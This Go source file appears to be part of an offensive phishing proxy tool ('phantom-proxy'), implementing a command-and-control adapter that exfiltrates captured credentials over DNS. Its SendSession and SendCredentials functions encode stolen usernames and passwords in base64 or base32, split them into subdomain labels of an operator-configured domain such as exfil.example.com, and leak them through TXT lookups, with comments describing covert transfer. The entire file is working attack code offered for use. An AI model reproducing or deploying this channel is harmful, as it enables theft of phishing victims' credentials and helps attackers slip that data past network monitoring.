package c2

import (
	"context"
	"encoding/base32"
	"encoding/base64"
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/database"
)

// DNSTunnelAdapter implements DNS-based data exfiltration channel
// Используется для скрытой передачи данных через DNS-запросы
type DNSTunnelAdapter struct {
	config     *DNSTunnelConfig
}

// DNSTunnelConfig configuration
type DNSTunnelConfig struct {
	Enabled      bool   `yaml:"enabled" mapstructure:"enabled"`
	Domain       string `yaml:"domain" mapstructure:"domain"`             // e.g. exfil.example.com
	Nameserver   string `yaml:"nameserver" mapstructure:"nameserver"`
	ChunkSize    int    `yaml:"chunk_size" mapstructure:"chunk_size"`
	EncodeBase32 bool   `yaml:"encode_base32" mapstructure:"encode_base32"`
}

// NewDNSTunnelAdapter creates DNS tunnel adapter
func NewDNSTunnelAdapter(cfg *DNSTunnelConfig) *DNSTunnelAdapter {
	return &DNSTunnelAdapter{config: cfg}
}

// Name returns adapter name
func (a *DNSTunnelAdapter) Name() string { return "dns_tunnel" }

// IsAvailable checks DNS resolution
func (a *DNSTunnelAdapter) IsAvailable(ctx context.Context) bool {
	if !a.config.Enabled || a.config.Domain == "" {
		return false
	}
	r := net.Resolver{}
	_, err := r.LookupHost(ctx, "check."+a.config.Domain)
	return err == nil || strings.Contains(err.Error(), "no such host") // NS может не отвечать на check
}

// SendSession encodes session data and sends via DNS queries (TXT/AAAA subdomains)
func (a *DNSTunnelAdapter) SendSession(ctx context.Context, data *SessionData) error {
	if !a.config.Enabled {
		return nil
	}
	if data.Credentials == nil {
		return nil
	}
	// Encode credentials in subdomain: cred.base64.domain
	payload := fmt.Sprintf("%s:%s", data.Credentials.Username, data.Credentials.Password)
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))
	if a.config.EncodeBase32 {
		encoded = base32.StdEncoding.EncodeToString([]byte(payload))
	}
	// Chunk and send as DNS lookups
	chunkSize := a.config.ChunkSize
	if chunkSize <= 0 {
		chunkSize = 60 // DNS label max 63
	}
	for i := 0; i < len(encoded); i += chunkSize {
		end := i + chunkSize
		if end > len(encoded) {
			end = len(encoded)
		}
		chunk := encoded[i:end]
		// Sanitize for DNS (only alphanumeric, hyphen)
		chunk = strings.ReplaceAll(chunk, "+", "-")
		chunk = strings.ReplaceAll(chunk, "/", "_")
		subdomain := fmt.Sprintf("%s.%s", chunk, a.config.Domain)
		resolver := net.Resolver{}
		_, _ = resolver.LookupTXT(ctx, subdomain)
		time.Sleep(100 * time.Millisecond)
	}
	return nil
}

// SendCredentials sends credentials via DNS
func (a *DNSTunnelAdapter) SendCredentials(ctx context.Context, creds *database.Credentials, metadata map[string]string) error {
	if !a.config.Enabled {
		return nil
	}
	_ = metadata
	payload := creds.Username + ":" + creds.Password
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))
	subdomain := "c." + encoded[:min(50, len(encoded))] + "." + a.config.Domain
	subdomain = strings.ReplaceAll(subdomain, "+", "-")
	subdomain = strings.ReplaceAll(subdomain, "/", "_")
	resolver := net.Resolver{}
	_, _ = resolver.LookupTXT(context.Background(), subdomain)
	return nil
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// HealthCheck verifies DNS config
func (a *DNSTunnelAdapter) HealthCheck(ctx context.Context) error {
	if !a.config.Enabled {
		return nil
	}
	if a.config.Domain == "" {
		return fmt.Errorf("dns_tunnel domain required")
	}
	return nil
}
